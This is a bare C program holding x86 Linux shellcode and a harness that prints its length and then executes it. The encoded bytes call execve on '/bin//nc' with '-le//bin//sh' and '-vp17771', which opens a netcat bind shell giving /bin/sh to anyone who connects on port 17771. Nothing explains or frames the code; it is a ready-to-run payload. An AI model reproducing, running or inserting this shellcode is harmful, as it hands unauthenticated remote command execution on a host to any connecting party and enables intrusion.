#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e"
"\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
printf("Shellcode Length    :  %d\n", strlen(shellcode));
  int (*ret)() = (int(*)())shellcode;
  ret();
}
